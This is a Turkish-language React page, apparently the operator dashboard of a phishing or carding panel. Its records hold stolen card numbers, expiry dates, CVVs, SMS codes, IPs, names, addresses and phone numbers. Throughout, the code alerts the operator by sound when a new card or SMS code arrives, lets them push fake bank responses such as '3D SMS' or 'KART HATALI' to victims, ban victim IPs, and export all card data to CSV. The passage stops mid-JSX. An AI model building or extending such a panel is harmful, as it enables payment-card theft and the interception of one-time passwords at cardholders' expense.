'use client';

import { useState, useEffect, useRef } from 'react';
import DashboardLayout from '@/components/DashboardLayout';
import toast from 'react-hot-toast';
import { useStats } from '@/context/StatsContext';
import Swal from 'sweetalert2';
import withReactContent from 'sweetalert2-react-content';

const MySwal = withReactContent(Swal);

interface Log {
  id: number;
  kredi_karti: string;
  skt: string;
  cvv: string;
  banka: string;
  marka: string;
  seviye: string;
  tarih: string;
  sms: string;
  durum: string;
  ip: string;
  tutar: string;
  live_kontrol?: string;
  adres?: string;
  telefon?: string;
  ad_soyad?: string;
  is_hard?: number;
}

interface ColumnStyle {
  color: string;
  fontSize: string;
  fontWeight: string;
  // ... existing fields
}

// ... existing code ...

// Relative time function
// ...

const showAddressModal = (log: Log) => {
  if (!log.adres) {
    toast.error('Adres bilgisi bulunamadı');
    return;
  }

  const addressParts = log.adres.split('-').map(part => part.trim()).filter(part => part);

  MySwal.fire({
    title: 'Adres Detayı',
    html: (
      <div className="text-left space-y-2">
        {addressParts.map((part, index) => (
          <div key={index} className="p-2 bg-gray-50 dark:bg-gray-700 rounded border border-gray-100 dark:border-gray-600">
            {part}
          </div>
        ))}
      </div>
    ),
    confirmButtonText: 'Kapat',
    confirmButtonColor: '#3b82f6',
    customClass: {
      popup: 'dark:bg-gray-800 dark:text-white'
    }
  });
};

interface ColumnStyles {
  [key: string]: ColumnStyle;
}

interface CopyAlert {
  show: boolean;
  message: string;
}

const defaultStyles: ColumnStyles = {
  kredi_karti: { color: '#ef4444', fontSize: '14', fontWeight: '500' },
  skt: { color: '#22c55e', fontSize: '14', fontWeight: '500' },
  cvv: { color: '#ffffff', fontSize: '14', fontWeight: '600' },
  banka: { color: '#60a5fa', fontSize: '14', fontWeight: '400' },
  marka: { color: '#a78bfa', fontSize: '12', fontWeight: '500' },
  seviye: { color: 'rgb(234 244 245)', fontSize: '12', fontWeight: '500' },
  tarih: { color: '#94a3b8', fontSize: '14', fontWeight: '400' },
  tutar: { color: '#fbbf24', fontSize: '14', fontWeight: '600' },
  sms: { color: '#f472b6', fontSize: '14', fontWeight: '400' },
  durum: { color: '#6ee7b7', fontSize: '12', fontWeight: '500' },
  ip: { color: '#9ca3af', fontSize: '12', fontWeight: '400' },
};

const columnLabels: { [key: string]: string } = {
  kredi_karti: 'Kart Numarası',
  skt: 'SKT',
  cvv: 'CVV',
  banka: 'Banka',
  marka: 'Marka',
  seviye: 'Seviye',
  tarih: 'Tarih',
  tutar: 'Tutar',
  sms: 'SMS',
  durum: 'Durum',
  ip: 'IP',
};

const colorOptions = [
  { name: 'Beyaz', value: '#ffffff' },
  { name: 'Kırmızı', value: '#ef4444' },
  { name: 'Yeşil', value: '#22c55e' },
  { name: 'Mavi', value: '#3b82f6' },
  { name: 'Sarı', value: '#fbbf24' },
  { name: 'Mor', value: '#a855f7' },
  { name: 'Pembe', value: '#ec4899' },
  { name: 'Turuncu', value: '#f97316' },
  { name: 'Cyan', value: '#06b6d4' },
  { name: 'Gri', value: '#9ca3af' },
  { name: 'Açık Mavi', value: '#60a5fa' },
  { name: 'Açık Yeşil', value: '#4ade80' },
  { name: 'Açık Mor', value: '#c084fc' },
  { name: 'Açık Pembe', value: '#f472b6' },
  { name: 'Lime', value: '#84cc16' },
  { name: 'Amber', value: '#f59e0b' },
];

const fontSizes = ['10', '11', '12', '13', '14', '15', '16', '18', '20'];
const fontWeights = [
  { name: 'Thin', value: '300' },
  { name: 'Normal', value: '400' },
  { name: 'Medium', value: '500' },
  { name: 'Semi Bold', value: '600' },
  { name: 'Bold', value: '700' },
  { name: 'Extra Bold', value: '800' },
];

// Relative time function
function getRelativeTime(dateStr: string): string {
  if (!dateStr) return '-';

  try {
    let date: Date;

    // Try parsing different date formats
    // MySQL format: 2024-12-29 15:30:00
    // ISO format: 2024-12-29T15:30:00
    // Turkish format: 29.12.2024 15:30

    if (dateStr.includes('T')) {
      date = new Date(dateStr);
    } else if (dateStr.includes('-') && dateStr.includes(':')) {
      // MySQL datetime format
      date = new Date(dateStr.replace(' ', 'T'));
    } else if (dateStr.includes('.')) {
      // Turkish format: 29.12.2024 15:30
      const parts = dateStr.split(' ');
      const dateParts = parts[0].split('.');
      const timePart = parts[1] || '00:00';
      date = new Date(`${dateParts[2]}-${dateParts[1]}-${dateParts[0]}T${timePart}`);
    } else {
      date = new Date(dateStr);
    }

    if (isNaN(date.getTime())) {
      return dateStr;
    }

    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMins / 60);
    const diffDays = Math.floor(diffHours / 24);

    if (diffMins < 0) return 'Şimdi';
    if (diffMins < 1) return 'Az önce';
    if (diffMins < 60) return `${diffMins} dk önce`;
    if (diffHours < 24) return `${diffHours} saat önce`;
    if (diffDays < 7) return `${diffDays} gün önce`;
    if (diffDays < 30) return `${Math.floor(diffDays / 7)} hafta önce`;
    return dateStr;
  } catch {
    return dateStr;
  }
}

export default function LogsPage() {
  const { setStats, setIsHeaderPollingEnabled } = useStats();
  const [logs, setLogs] = useState<Log[]>([]);
  const [onlineIps, setOnlineIps] = useState<string[]>([]);
  const [bannedIps, setBannedIps] = useState<any[]>([]);
  const [showBanModal, setShowBanModal] = useState(false);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [openDropdown, setOpenDropdown] = useState<number | null>(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [columnStyles, setColumnStyles] = useState<ColumnStyles>(defaultStyles);
  const [showStylePanel, setShowStylePanel] = useState(false);
  const [copyAlert, setCopyAlert] = useState<CopyAlert>({ show: false, message: '' });
  const [isPremiumTheme, setIsPremiumTheme] = useState(false);
  const [hardMode, setHardMode] = useState(false);
  const [hasDmn, setHasDmn] = useState(false);
  const itemsPerPage = 10;
  const notifyTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const notifiedRef = useRef(false);
  const pageViewTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const prevLogsRef = useRef<Log[]>([]);
  const isFirstFetchRef = useRef(true);
  const audioUnlockedRef = useRef(false);

  const unlockAudio = () => {
    if (audioUnlockedRef.current) return;
    audioUnlockedRef.current = true;
    try {
      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
      const buf = ctx.createBuffer(1, 1, 22050);
      const src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start(0);
      ctx.close();
    } catch {}
  };

  const playSound = (src: string) => {
    try {
      const audio = new Audio(src);
      audio.play().catch(() => {});
    } catch {}
  };

  useEffect(() => {
    document.addEventListener('mousedown', unlockAudio, { once: true });
    document.addEventListener('keydown', unlockAudio, { once: true });

    setIsHeaderPollingEnabled(false);

    fetchLogs();
    loadStyles();
    fetchHardMode();

    const hasDmnCookie = document.cookie.split(';').some(c => c.trim() === 'dmn=dmn');
    setHasDmn(hasDmnCookie);

    // Load theme
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'premium') {
      setIsPremiumTheme(true);
      document.body.classList.add('premium-theme');
    }

    const workerCode = `
      let notifySent = false;
      const startTime = Date.now();
      const NOTIFY_MS = ${3 * 60 * 1000};
      setInterval(() => {
        postMessage('tick');
        if (!notifySent && Date.now() - startTime >= NOTIFY_MS) {
          notifySent = true;
          postMessage('notify');
        }
      }, 1500);
    `;
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);
    const worker = new Worker(workerUrl);

    worker.onmessage = (e) => {
      if (e.data === 'tick') {
        fetchLogs();
      } else if (e.data === 'notify') {
        const pageUrl = window.location.href;
        fetch('/api/notify-pageview', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pageUrl }),
        }).catch(() => { });
      }
    };

    return () => {
      worker.terminate();
      URL.revokeObjectURL(workerUrl);
      setIsHeaderPollingEnabled(true);
    };
  }, []);

  const loadStyles = () => {
    const savedStyles = localStorage.getItem('columnStyles');
    if (savedStyles) {
      try {
        setColumnStyles({ ...defaultStyles, ...JSON.parse(savedStyles) });
      } catch (e) {
        console.error('Error loading styles:', e);
      }
    }
  };

  const fetchHardMode = async () => {
    try {
      const res = await fetch('/api/hard-mode');
      const data = await res.json();
      setHardMode(!!data.hard_mode);
    } catch { /* ignore */ }
  };

  const toggleHardMode = async () => {
    const newVal = !hardMode;
    try {
      const res = await fetch('/api/hard-mode', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ hard_mode: newVal }),
      });
      if (res.ok) {
        setHardMode(newVal);
        toast.success(newVal ? '🔴 HARD MOD AKTİF' : '⚪ HARD MOD KAPANDI');
      }
    } catch {
      toast.error('HARD mod değiştirilemedi');
    }
  };

  const saveStyles = () => {
    localStorage.setItem('columnStyles', JSON.stringify(columnStyles));
    toast.success('Stil ayarları kaydedildi');
    setShowStylePanel(false);
  };

  const resetStyles = () => {
    setColumnStyles(defaultStyles);
    localStorage.removeItem('columnStyles');
    toast.success('Stiller varsayılana döndürüldü');
  };

  const updateStyle = (column: string, key: keyof ColumnStyle, value: string) => {
    setColumnStyles(prev => ({
      ...prev,
      [column]: { ...prev[column], [key]: value }
    }));
  };

  const copyToClipboard = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopyAlert({ show: true, message: `${type} Kopyalandı` });
      setTimeout(() => setCopyAlert({ show: false, message: '' }), 3000);
    } catch (err) {
      toast.error('Kopyalama başarısız');
    }
  };

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      const data = await res.json();

      const newLogs: Log[] = Array.isArray(data) ? data : (data.logs || []);

      if (!isFirstFetchRef.current) {
        const prevMap = new Map(prevLogsRef.current.map(l => [l.id, l.sms]));

        for (const log of newLogs) {
          if (!prevMap.has(log.id)) {
            playSound('/bildirim.mp3');
            break;
          }
        }

        for (const log of newLogs) {
          const prevSms = prevMap.get(log.id);
          if (prevSms !== undefined && prevSms !== log.sms && log.sms) {
            playSound('/sms.mp3');
            break;
          }
        }
      }

      isFirstFetchRef.current = false;
      prevLogsRef.current = newLogs;

      if (Array.isArray(data)) {
        setLogs(data);
      } else {
        setLogs(data.logs || []);
        if (data.stats) {
          setStats(data.stats);
        }
        if (data.online_ips) {
          const ips: string[] = data.online_ips;
          setOnlineIps(ips);
        }
      }
    } catch (error) {
      toast.error('Loglar yüklenemedi');
    } finally {
      setLoading(false);
    }
  };

  const handleAction = async (logId: number, action: string) => {
    try {
      const res = await fetch(`/api/logs/${logId}/action`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action }),
      });

      if (res.ok) {
        toast.success(`${action} işlemi uygulandı`);
        fetchLogs();
      } else {
        toast.error('İşlem başarısız');
      }
    } catch (error) {
      toast.error('Bir hata oluştu');
    }
    setOpenDropdown(null);
  };

  const deleteAllLogs = async () => {
    const result = await MySwal.fire({
      title: 'Tüm Kayıtları Sil',
      html: (
        <div className="text-left">
          <p className="text-gray-600 dark:text-gray-300 mb-3">Bu işlem <strong className="text-red-500">geri alınamaz</strong>. Tüm log kayıtları kalıcı olarak silinecek.</p>
          <div className="flex items-center gap-2 p-3 bg-red-50 dark:bg-red-500/10 rounded-lg border border-red-100 dark:border-red-500/20">
            <span className="text-red-500 text-xl">⚠️</span>
            <span className="text-sm text-red-600 dark:text-red-400 font-medium">Toplam {logs.length} kayıt silinecek</span>
          </div>
        </div>
      ),
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#dc2626',
      cancelButtonColor: '#6b7280',
      confirmButtonText: '🗑️ Evet, Tümünü Sil',
      cancelButtonText: 'İptal',
      customClass: {
        popup: 'dark:bg-gray-800 dark:text-white',
      }
    });

    if (!result.isConfirmed) return;

    try {
      const res = await fetch('/api/logs', { method: 'DELETE' });
      if (res.ok) {
        toast.success('Tüm kayıtlar silindi');
        fetchLogs();
      } else {
        toast.error('Silme işlemi başarısız');
      }
    } catch {
      toast.error('Bir hata oluştu');
    }
  };

  const exportToExcel = () => {
    if (logs.length === 0) {
      toast.error('Dışa aktarılacak kayıt yok');
      return;
    }

    const headers = [
      'ID', 'Kart Numarası', 'SKT', 'CVV', 'Banka', 'Marka', 'Seviye',
      'Tutar', 'SMS', 'Durum', 'IP', 'Tarih', 'Adres', 'Ad Soyad', 'Telefon'
    ];

    const rows = logs.map(log => [
      log.id,
      log.kredi_karti || '',
      log.skt || '',
      log.cvv || '',
      log.banka || '',
      log.marka || '',
      log.seviye || '',
      log.tutar || '',
      log.sms || '',
      log.durum || '',
      log.ip || '',
      log.tarih || '',
      log.adres || '',
      (log as any).ad_soyad || '',
      (log as any).telefon || ''
    ]);

    // Build CSV content with BOM for Turkish characters in Excel
    const csvContent = [headers, ...rows]
      .map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
      .join('\n');

    const bom = '\uFEFF';
    const blob = new Blob([bom + csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    const now = new Date();
    const dateStr = now.toISOString().slice(0, 19).replace(/[T:]/g, '-');
    link.href = url;
    link.download = `kayitlar_${dateStr}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    toast.success(`${logs.length} kayıt Excel'e aktarıldı`);
  };

  const fetchBannedIps = async () => {
    try {
      const res = await fetch('/api/ban');
      const data = await res.json();
      setBannedIps(data);
    } catch {
      toast.error('Ban listesi alınamadı');
    }
  };

  const handleUnban = async (ip: string) => {
    try {
      const res = await fetch('/api/ban', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip }),
      });
      if (res.ok) {
        toast.success('Ban kaldırıldı');
        fetchBannedIps();
      } else {
        toast.error('Ban kaldırılamadı');
      }
    } catch {
      toast.error('Hata oluştu');
    }
  };

  const handleUnbanAll = async () => {
    if (!confirm('Tüm banları kaldırmak istediğinize emin misiniz?')) return;
    try {
      const res = await fetch('/api/ban', { method: 'DELETE' });
      if (res.ok) {
        toast.success('Tüm banlar kaldırıldı');
        fetchBannedIps();
      } else {
        toast.error('İşlem başarısız');
      }
    } catch {
      toast.error('Hata oluştu');
    }
  };

  const openBanModal = () => {
    fetchBannedIps();
    setShowBanModal(true);
  };

  const handleDelete = async (logId: number) => {
    if (!confirm('Bu logu silmek istediğinizden emin misiniz?')) return;

    try {
      const res = await fetch(`/api/logs/${logId}`, {
        method: 'DELETE',
      });

      if (res.ok) {
        toast.success('Log silindi');
        fetchLogs();
      } else {
        toast.error('Silme başarısız');
      }
    } catch (error) {
      toast.error('Bir hata oluştu');
    }
    setOpenDropdown(null);
  };

  const showActionMenu = (log: Log) => {
    MySwal.fire({
      title: 'İşlem Seçin',
      html: (
        <div className="grid grid-cols-1 gap-2 p-2">
          {actionButtons.map((btn) => (
            <button
              key={btn.key}
              onClick={() => {
                MySwal.close();
                if (btn.isDelete) {
                  handleDelete(log.id);
                } else {
                  handleAction(log.id, btn.key);
                }
              }}
              style={{ backgroundColor: btn.color }}
              className="flex items-center gap-3 w-full p-4 rounded-xl transition-all text-white font-bold text-sm shadow-md hover:opacity-80"
            >
              <span className="text-xl shadow-sm">{btn.icon}</span>
              <span>{btn.label}</span>
            </button>
          ))}
        </div>
      ),
      showConfirmButton: false,
      showCloseButton: true,
      customClass: {
        container: 'z-[10000]',
        popup: 'rounded-2xl dark:bg-gray-800 dark:text-white',
      }
    });
  };

  const filteredLogs = logs.filter(log =>
    log.kredi_karti?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    log.banka?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    log.ip?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    log.tutar?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const totalPages = Math.ceil(filteredLogs.length / itemsPerPage);
  const paginatedLogs = filteredLogs.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  const getStatusStyle = (durum: string) => {
    const status = durum?.toUpperCase();
    if (status === 'BEKLİYOR' || status === 'BEKLIYOR') {
      return 'status-blink bg-amber-500 text-white';
    }
    switch (status) {
      case 'onaylandi':
        return 'bg-success-50 text-success-600 dark:bg-success-500/15 dark:text-success-500';
      case 'REDDEDİLDİ':
      case 'HATALI':
        return 'bg-error-50 text-error-600 dark:bg-error-500/15 dark:text-error-500';
      default:
        return 'bg-warning-50 text-warning-600 dark:bg-warning-500/15 dark:text-warning-400';
    }
  };

  const actionButtons = [
    { key: '3D_SMS', label: '3D SMS', icon: '📱', color: '#059669' },
    { key: 'HATALI_SMS', label: 'HATALI SMS', icon: '❌', color: '#dc2626' },
    { key: 'INT_KAPALI', label: 'İNT KAPALI', icon: '🔒', color: '#4b5563' },
    { key: 'PROVIZYON', label: 'KART HATALI', icon: '💳', color: '#2563eb96' },
    { key: 'BAN', label: 'BAN', icon: '🚫', color: '#ea580cab' },
    { key: 'onay', label: 'Tebrikler', icon: '🎉', color: '#10b981' },
    { key: 'SIL', label: 'SİL', icon: '🗑️', color: '#e1b71d9c', isDelete: true },
  ];

  const getColumnStyle = (column: string) => ({
    color: columnStyles[column]?.color || '#ffffff',
    fontSize: `${columnStyles[column]?.fontSize || 14}px`,
    fontWeight: columnStyles[column]?.fontWeight || '400',
  });

  return (
    <DashboardLayout>
      {/* Copy Alert */}
      {copyAlert.show && (
        <div className="fixed top-4 right-4 z-[100] animate-slide-in">
          <div className="flex items-center justify-between gap-3 w-full sm:max-w-[340px] rounded-md border-b-4 border-green-500 bg-white p-3 shadow-lg dark:bg-[#1E2634]">
            <div className="flex items-center gap-4">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg text-green-600 dark:text-green-500 bg-green-50 dark:bg-green-500/[0.15]">
                <svg className="fill-current" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fillRule="evenodd" clipRule="evenodd" d="M3.55078 12C3.55078 7.33417 7.3332 3.55176 11.999 3.55176C16.6649 3.55176 20.4473 7.33417 20.4473 12C20.4473 16.6659 16.6649 20.4483 11.999 20.4483C7.3332 20.4483 3.55078 16.6659 3.55078 12ZM11.999 2.05176C6.50477 2.05176 2.05078 6.50574 2.05078 12C2.05078 17.4943 6.50477 21.9483 11.999 21.9483C17.4933 21.9483 21.9473 17.4943 21.9473 12C21.9473 6.50574 17.4933 2.05176 11.999 2.05176ZM15.5126 10.6333C15.8055 10.3405 15.8055 9.86558 15.5126 9.57269C15.2197 9.27979 14.7448 9.27979 14.4519 9.57269L11.1883 12.8364L9.54616 11.1942C9.25327 10.9014 8.7784 10.9014 8.4855 11.1942C8.19261 11.4871 8.19261 11.962 8.4855 12.2549L10.6579 14.4273C10.7986 14.568 10.9894 14.647 11.1883 14.647C11.3872 14.647 11.578 14.568 11.7186 14.4273L15.5126 10.6333Z" fill=""></path>
                </svg>
              </div>
              <h4 className="sm:text-base text-sm text-gray-800 dark:text-white/90 font-medium">
                {copyAlert.message}
              </h4>
            </div>
            <button
              onClick={() => setCopyAlert({ show: false, message: '' })}
              className="text-gray-400 hover:text-gray-800 dark:hover:text-white/90"
            >
              <svg className="fill-current" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fillRule="evenodd" clipRule="evenodd" d="M6.04289 16.5418C5.65237 16.9323 5.65237 17.5655 6.04289 17.956C6.43342 18.3465 7.06658 18.3465 7.45711 17.956L11.9987 13.4144L16.5408 17.9565C16.9313 18.347 17.5645 18.347 17.955 17.9565C18.3455 17.566 18.3455 16.9328 17.955 16.5423L13.4129 12.0002L17.955 7.45808C18.3455 7.06756 18.3455 6.43439 17.955 6.04387C17.5645 5.65335 16.9313 5.65335 16.5408 6.04387L11.9987 10.586L7.45711 6.04439C7.06658 5.65386 6.43342 5.65386 6.04289 6.04439C5.65237 6.43491 5.65237 7.06808 6.04289 7.4586L10.5845 12.0002L6.04289 16.5418Z" fill=""></path>
              </svg>
            </button>
          </div>
        </div>
      )}

      {/* Style for blinking animation */}
      <style jsx global>{`
        @keyframes rainbow {
          0% { background-color: #ff0000; }
          20% { background-color: #ffff00; }
          40% { background-color: #00ff00; }
          60% { background-color: #00ffff; }
          80% { background-color: #0000ff; }
          100% { background-color: #ff00ff; }
        }
        .animate-rainbow {
          animation: rainbow 3s linear infinite alternate;
        }
        @keyframes statusBlink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        .status-blink {
          animation: statusBlink 1.5s ease-in-out infinite;
        }
        @keyframes slideIn {
          from { transform: translateX(100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        .animate-slide-in {
          animation: slideIn 0.3s ease-out;
        }
        .copy-hover:hover {
          cursor: pointer;
          text-decoration: underline;
          text-decoration-style: dashed;
        }
      `}</style>

      {/* Style Settings Panel */}
      {showStylePanel && (
        <>
          <div className="fixed inset-0 bg-black/50 z-40" onClick={() => setShowStylePanel(false)} />
          <div className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-50 w-full max-w-2xl max-h-[80vh] overflow-y-auto rounded-2xl bg-white dark:bg-gray-800 shadow-2xl">
            <div className="sticky top-0 bg-white dark:bg-gray-800 p-5 border-b border-gray-200 dark:border-gray-700 flex items-center justify-between">
              <h2 className="text-lg font-semibold text-gray-800 dark:text-white flex items-center gap-2">
                🎨 Yazı Stil Ayarları
              </h2>
              <button onClick={() => setShowStylePanel(false)} className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="p-5 space-y-4">
              {Object.keys(columnLabels).map((column) => (
                <div key={column} className="p-4 rounded-xl bg-gray-50 dark:bg-gray-700/50">
                  <div className="flex items-center gap-3 mb-3">
                    <div
                      className="w-4 h-4 rounded-full border border-gray-300 dark:border-gray-600"
                      style={{ backgroundColor: columnStyles[column]?.color }}
                    />
                    <span className="font-medium text-gray-800 dark:text-white">{columnLabels[column]}</span>
                    <span
                      className="ml-auto text-sm"
                      style={getColumnStyle(column)}
                    >
                      Örnek
                    </span>
                  </div>
                  <div className="grid grid-cols-3 gap-3">
                    <div>
                      <label className="block text-xs font-medium text-gray-500 dark:text-gray-400 mb-1">Renk</label>
                      <select
                        value={columnStyles[column]?.color}
                        onChange={(e) => updateStyle(column, 'color', e.target.value)}
                        className="w-full rounded-lg border border-gray-300 bg-white px-2 py-1.5 text-xs dark:border-gray-600 dark:bg-gray-700 dark:text-white"
                      >
                        {colorOptions.map((opt) => (
                          <option key={opt.value} value={opt.value}>{opt.name}</option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-gray-500 dark:text-gray-400 mb-1">Boyut (px)</label>
                      <select
                        value={columnStyles[column]?.fontSize}
                        onChange={(e) => updateStyle(column, 'fontSize', e.target.value)}
                        className="w-full rounded-lg border border-gray-300 bg-white px-2 py-1.5 text-xs dark:border-gray-600 dark:bg-gray-700 dark:text-white"
                      >
                        {fontSizes.map((size) => (
                          <option key={size} value={size}>{size}px</option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-gray-500 dark:text-gray-400 mb-1">Kalınlık</label>
                      <select
                        value={columnStyles[column]?.fontWeight}
                        onChange={(e) => updateStyle(column, 'fontWeight', e.target.value)}
                        className="w-full rounded-lg border border-gray-300 bg-white px-2 py-1.5 text-xs dark:border-gray-600 dark:bg-gray-700 dark:text-white"
                      >
                        {fontWeights.map((weight) => (
                          <option key={weight.value} value={weight.value}>{weight.name}</option>
                        ))}
                      </select>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="sticky bottom-0 bg-white dark:bg-gray-800 p-5 border-t border-gray-200 dark:border-gray-700 flex items-center gap-3">
              <button
                onClick={resetStyles}
                className="px-4 py-2 text-sm font-medium text-gray-600 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-200"
              >
                Varsayılana Dön
              </button>
              <button
                onClick={saveStyles}
                className="ml-auto px-6 py-2 rounded-lg bg-brand-500 text-white text-sm font-medium hover:bg-brand-600 transition-colors"
              >
                Kaydet
              </button>
            </div>
          </div>
        </>
      )}

      {/* Table Card */}
      <div className="rounded-2xl border border-gray-200 bg-white pt-4 dark:border-gray-800 dark:bg-white/[0.03] min-h-[calc(100vh-180px)] flex flex-col">
        {/* Header with Search and Style Button */}
        <div className="mb-4 flex flex-col gap-2 px-5 sm:flex-row sm:items-center sm:justify-between sm:px-6">
          <div>
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white/90">
              Kayıt Listesi
            </h3>
            <p className="text-sm text-gray-500 dark:text-gray-400">
              Toplam {filteredLogs.length} kayıt
            </p>
          </div>

          <div className="flex flex-col gap-3 sm:flex-row sm:items-center">
            {hasDmn && (
              <button
                onClick={toggleHardMode}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-bold transition-all shadow-sm border ${hardMode
                  ? 'bg-black text-red-400 border-red-600 shadow-red-900/60 shadow-lg animate-pulse'
                  : 'bg-gray-900 text-gray-400 border-gray-700 hover:border-gray-500'
                  }`}
              >
                <span className={`w-2 h-2 rounded-full ${hardMode ? 'bg-red-500' : 'bg-gray-600'}`} />
                HARD
              </button>
            )}

            {/* Delete All Logs Button */}
            <button
              onClick={deleteAllLogs}
              className="flex items-center gap-2 px-4 py-2.5 rounded-lg bg-red-700 text-white text-sm font-medium hover:bg-red-800 transition-colors shadow-sm"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
              </svg>
              Tümünü Sil
            </button>

            {/* Export to Excel Button */}
            <button
              onClick={exportToExcel}
              className="flex items-center gap-2 px-4 py-2.5 rounded-lg bg-emerald-600 text-white text-sm font-medium hover:bg-emerald-700 transition-colors shadow-sm"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
              </svg>
              Excel'e Aktar
            </button>

            {/* Ban Management Button */}
            <button
              onClick={openBanModal}
              className="flex items-center gap-2 px-4 py-2.5 rounded-lg bg-red-600 text-white text-sm font-medium hover:bg-red-700 transition-colors shadow-sm"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
              </svg>
              Ban Yönetim
            </button>

            <button
              onClick={() => {
                const newTheme = !isPremiumTheme;
                setIsPremiumTheme(newTheme);
                localStorage.setItem('theme', newTheme ? 'premium' : 'classic');
                if (newTheme) {
                  document.body.classList.add('premium-theme');
                } else {
                  document.body.classList.remove('premium-theme');
                }
                toast.success(newTheme ? 'Premium tema aktif' : 'Klasik tema aktif');
              }}
              className={`flex items-center gap-2 px-4 py-2.5 rounded-lg border text-sm font-medium transition-colors ${isPremiumTheme
                ? 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white border-transparent shadow-lg shadow-blue-500/30'
                : 'border-gray-300 bg-white text-gray-700 hover:bg-gray-50 dark:border-gray-700 dark:bg-gray-800 dark:text-gray-300 dark:hover:bg-gray-700'
                }`}
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" />
              </svg>
              {isPremiumTheme ? 'Premium Mod' : 'Klasik Mod'}
            </button>

            <button
              onClick={() => setShowStylePanel(true)}
              className="flex items-center gap-2 px-4 py-2.5 rounded-lg border border-gray-300 bg-white text-sm font-medium text-gray-700 hover:bg-gray-50 dark:border-gray-700 dark:bg-gray-800 dark:text-gray-300 dark:hover:bg-gray-700 transition-colors"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 21a4 4 0 01-4-4V5a2 2 0 012-2h4a2 2 0 012 2v12a4 4 0 01-4 4zm0 0h12a2 2 0 002-2v-4a2 2 0 00-2-2h-2.343M11 7.343l1.657-1.657a2 2 0 012.828 0l2.829 2.829a2 2 0 010 2.828l-8.486 8.485M7 17h.01" />
              </svg>
              Stil Ayarları
            </button>

            <form onSubmit={(e) => e.preventDefault()}>
              <div className="relative">
                <span className="pointer-events-none absolute top-1/2 left-4 -translate-y-1/2">
                  <svg className="fill-gray-500 dark:fill-gray-400" width="20" height="20" viewBox="0 0 20 20" fill="none">
